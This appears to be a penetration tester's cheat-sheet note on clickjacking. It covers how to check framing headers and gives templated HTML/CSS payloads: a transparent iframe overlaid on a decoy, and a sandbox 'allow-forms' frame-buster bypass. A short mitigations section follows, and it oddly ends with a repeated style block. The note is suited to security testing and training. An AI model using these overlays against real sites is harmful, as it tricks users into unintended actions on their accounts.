ClickJacking

  • ClickJacking is where a user can be tricked into performing an action on a website that’s hidden within the content of a decoy website.
  • Burp Suite’s ClickBandit is a good tool for generating payloads

If X-Frame-Options is set to ‘deny’ or ‘sameorigin’ application is not likely vulnerable to clickjacking

Same for Frame-Ancestors CSP directive when set to ‘none’ or ‘self’. if it contains domains, check wildcard configuration

Payload:

<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="website.com"></iframe>

  • We can try prefilling user input data through URL parameters!
website.com/login?username=test&password=moo

Frame Buster bypass (sandbox allow-forms):

<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="website.com"></iframe>

Mitigations:

Set X-Frame-Options is set to ‘deny’ or ‘sameorigin’.

Set Frame-Ancestors CSP directive when set to ‘none’ or ‘self’. if it must contain domains, check wildcard configuration.

<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;

    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
